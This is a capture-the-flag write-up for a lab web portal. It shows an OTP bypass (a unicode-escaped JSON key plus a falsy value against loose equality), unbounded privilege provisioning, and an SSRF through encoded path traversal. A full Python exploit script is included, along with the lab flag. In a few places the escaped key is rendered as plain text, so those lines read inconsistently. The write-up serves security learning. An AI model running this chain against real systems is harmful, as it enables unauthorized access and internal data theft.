# blackmesa-004 - BugForge

**Difficulty:** Hard
**Vulnerability:** OTP verification type-confusion (hidden-key bypass) -> unconstrained user provisioning -> SSRF via allow-list normalisation bypass
**Flag:** `bug{wK3Hpjb9cFI7utOHhOKOLEC6sgX4Yw91}`

---

## Summary

MesaNet Access Panel is a multi-app portal (mail, notes, vault, vetting) sitting behind a session-based login and a gateway proxy for internal microservices. A hidden developer console at `/dev` is gated by a rotating 6-digit OTP. The verification endpoint applies a raw-body filter to the submitted `otp` field that only recognises the literal key text - encoding one character of the key with a JSON unicode escape hides the field from that filter while `JSON.parse` still reconstructs the key normally. Combined with submitting a non-string value, the request reaches the real comparison logic and satisfies a loose-equality check against the not-yet-generated (falsy-default) OTP state on a fresh session. That unlocks the dev console, whose user-provisioning API accepts arbitrary clearance levels and app entitlements with no ceiling. A provisioned high-clearance account exposes the vetting app, whose reference-URL field is checked against an allow-list before the fetch but the underlying HTTP client normalises `%2e%2e` to `..` afterward, allowing traversal into an internal-only endpoint that discloses the flag.

---

## App Structure

| Endpoint | Notes |
|----------|-------|
| `POST /login` | Form-based login (x-www-form-urlencoded) |
| `GET /` | Dashboard, shows unlocked apps based on entitlements |
| `GET /dev` | Developer console, OTP-gated (6-digit, 60s rotation) |
| `GET /dev/time-remaining` | Returns `{"remaining": N}`, counts down from 60 |
| `POST /dev/verify` | OTP submission, `{"otp": "..."}` |
| `POST /api/dev/users` | Dev-console-only user provisioning |
| `GET /apps/vault`, `GET /apps/vetting` | Locked apps, hidden from dashboard unless entitled |
| `POST /gateway` | Proxy to internal subsystems: `{id, endpoint, data}` |

Initial credentials (`operator:operator`) give a baseline account with no access to vault or vetting.

---

## Discovery

### Step 1 - The OTP gate

`/dev` redirects to a 60-second rotating OTP challenge. `POST /dev/verify` with a wrong string guess returns `Invalid one-time password. N attempt(s) remaining.` and decrements a 10-attempt session budget. Re-logging in resets the budget entirely, since the counter lives on the session rather than the account.

### Step 2 - Type confusion in the verify handler

Submitting the `otp` field as something other than a string behaves differently from a wrong string guess:

```
{"otp":["000000"]}       -> "Invalid...", counter NOT decremented
{"otp":0}                -> "Invalid...", counter NOT decremented
```

Both come back with an identical response body and no attempt cost, suggesting these values never actually reach the real comparison - something ahead of it is rejecting or stripping non-string `otp` values before the handler processes them, without accounting them as a real attempt.

### Step 3 - Hiding the key changes the behaviour

Encoding the `o` of the key with a JSON unicode escape (`"otp"` instead of `"otp"`) means the literal substring `otp` never appears in the raw request body, even though `JSON.parse` reconstructs the key as `otp` normally:

```
{"otp":["test"]}    -> attempt counter now decrements (10 -> 9)
```

That confirms whatever is intercepting non-string `otp` submissions is working off the raw, unparsed body text rather than the parsed value - hiding the key from it lets the field through untouched.

### Step 4 - Full-array membership sweep (dead end)

Since arrays no longer get silently dropped once the key is hidden, the natural next test is submitting the entire keyspace as one array, betting on a `.some()`-style membership check server-side:

```python
body = '{"\\u006ftp":' + json.dumps(list(range(lo, hi))) + '}'
```

Chunked to stay under the ~100KB body-size limit (roughly 12,000 candidates per request) and cycling fresh logins to reset the 10-attempt budget each time (confirmed to reliably reset it), the full 0-999999 range was swept in under 10 seconds across ~84 requests. No hit. This makes sense in retrospect: a multi-element JS array coerced against a scalar via `==` stringifies to a long comma-joined list, which never parses back to a clean number - so no array of guesses can ever satisfy a loose-equality check against a single current code, regardless of whether it contains the right value. Array-based mass guessing is a structural dead end here, not something that just happens to be blocked.

### Step 5 - Falsy-value bypass on a fresh session

Testing a bare non-string, non-array value combined with the hidden key against a completely fresh session (login, then the very first `/dev/verify` call):

```
{"otp":0}
```

returns `302 Found -> /dev`. The dev console has no eagerly-generated OTP on a brand-new session; the comparison is loose (`==`), and a submitted `0` satisfies it against whatever falsy default the OTP variable holds before it has been properly seeded. Combining the hidden-key trick (to stop the value being stripped before comparison) with a value JavaScript treats as falsy is what actually lands the bypass - neither piece alone is sufficient.

### Step 6 - Unconstrained user provisioning

Inside `/dev`, `POST /api/dev/users` requires `username`, `password`, and `fullName`, but accepts arbitrary `clearanceLevel` and `entitlements` with no server-side ceiling:

```json
{
  "username": "pentest01",
  "password": "<random>",
  "fullName": "Pentest Account",
  "clearanceLevel": 5,
  "entitlements": {
    "vetting": {"access": true, "review": true},
    "vault": {"access": true}
  }
}
```

Logging in as the new account exposes both the vault and vetting apps on the dashboard.

### Step 7 - SSRF via allow-list normalisation bypass

The vetting app lets a candidate be submitted with a `referenceUrl` that the server fetches during verification. The allow-list only permits `http://internal.mesanet.local/refs/...`, checked against the raw string, but the underlying request resolves URL-encoded traversal sequences after that check:

```json
POST /gateway
{
  "id": "<vetting-app-uuid>",
  "endpoint": "/api/vetting/submit",
  "data": {
    "name": "pentest",
    "position": "n/a",
    "bio": "n/a",
    "referenceUrl": "http://internal.mesanet.local/refs/%2e%2e/internal/clearance-registry"
  }
}
```

Triggering the verify step against that candidate:

```json
POST /gateway
{
  "id": "<vetting-app-uuid>",
  "endpoint": "/api/vetting/verify",
  "data": {"id": <candidate-id>}
}
```

fetches `%2e%2e` decoded to `..`, landing on `/internal/clearance-registry` instead of a `/refs/:id` record, and returns the flag in the response's `preview` field.

---

## Exploit

```python
import httpx, asyncio, json

LAB = "https://<lab-host>"

async def main():
    async with httpx.AsyncClient(verify=False, http2=True) as c:
        # 1. fresh session, OTP dual bypass
        r = await c.post(f"{LAB}/login", data={"username": "operator", "password": "operator"})
        sid = r.cookies.get("connect.sid")
        r = await c.post(f"{LAB}/dev/verify",
                          content='{"\\u006ftp":0}',
                          headers={"Content-Type": "application/json"},
                          cookies={"connect.sid": sid})
        assert r.status_code == 302 and r.headers["location"] == "/dev"

        # 2. provision a high-clearance user
        r = await c.post(f"{LAB}/api/dev/users", json={
            "username": "pentest01", "password": "PentestPass1!",
            "fullName": "Pentest Account", "clearanceLevel": 5,
            "entitlements": {"vetting": {"access": True, "review": True},
                              "vault": {"access": True}}},
            cookies={"connect.sid": sid})
        assert r.status_code == 200

        # 3. login as the new user
        c.cookies.clear()
        r = await c.post(f"{LAB}/login", data={"username": "pentest01", "password": "PentestPass1!"})
        sid2 = r.cookies.get("connect.sid")

        # find the vetting app uuid from /apps/vetting page, then:
        vetting_id = "<vetting-app-uuid>"
        r = await c.post(f"{LAB}/gateway", json={
            "id": vetting_id, "endpoint": "/api/vetting/submit",
            "data": {"name": "pentest", "position": "n/a", "bio": "n/a",
                     "referenceUrl": "http://internal.mesanet.local/refs/%2e%2e/internal/clearance-registry"}},
            cookies={"connect.sid": sid2})
        cand_id = r.json()["id"]

        r = await c.post(f"{LAB}/gateway", json={
            "id": vetting_id, "endpoint": "/api/vetting/verify",
            "data": {"id": cand_id}}, cookies={"connect.sid": sid2})
        print(r.json()["preview"])

asyncio.run(main())
```

---

## Dead Ends

| Attempt | Why it failed |
|---------|--------------|
| Wrong string guesses at `/dev/verify` | Real check, real decrement, 10-attempt session budget - not viable to brute force a 6-digit rotating value this way |
| `{"otp":["..."]}` / `{"otp":0}` (plain key) | Something ahead of the handler strips/rejects non-string values keyed on the raw literal `otp` text; response is indistinguishable from a normal wrong guess and costs no attempt, but can never succeed |
| Full 0-999999 array sent as one hidden-key payload | Reaches real logic (decrements) but a multi-element array coerces to a non-numeric string under `==`, so it can never match a scalar current code no matter what it contains |
| Individual numeric guesses at max measured throughput (~360 req/s) | Nowhere near the ~16,700 req/s needed to cover a 1,000,000-value keyspace inside one 60-second rotation window |
| Timing the falsy-value guess to the exact rotation boundary across several cycles | No hit across repeated tries; the actual working condition turned out to be "first verify call on a brand-new session," not "request timed to the rotation boundary" |

---

## Root Cause

The `/dev/verify` handler has two independent flaws that only become exploitable together. First, whatever filters non-string `otp` submissions works off the raw, unparsed request body rather than the value `JSON.parse` produces, so a JSON-legal unicode escape in the key defeats it entirely while leaving the parsed value untouched. Second, the actual grant check uses loose (`==`) equality against an OTP value that has a falsy default before it is first properly generated on a session, so a bare `0` (or any other falsy-coercible JSON value) satisfies it in that window. Neither bug alone is exploitable: hiding the key without a matching value change still fails the comparison, and a plain non-hidden falsy value gets stripped before ever reaching it.

The provisioning and SSRF bugs downstream are more conventional: `POST /api/dev/users` never bounds `clearanceLevel` or `entitlements` against the requesting user's own privilege, and the vetting `referenceUrl` allow-list validates the pre-decode string while the fetch itself decodes the path afterward.

---

## CWE / OWASP

- **CWE-436**: Interpretation Conflict (raw-body filter vs. parsed-JSON handler disagree on what the request contains)
- **CWE-697**: Incorrect Comparison (loose equality against a falsy default value)
- **CWE-269**: Improper Privilege Management (unconstrained `clearanceLevel`/`entitlements` on user creation)
- **CWE-918**: Server-Side Request Forgery
- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory (allow-list validated before path normalisation)
- **OWASP A04:2021** - Insecure Design (dev console reachable pre-auth just by finding the path)
- **OWASP A01:2021** - Broken Access Control (provisioning endpoint, SSRF allow-list)
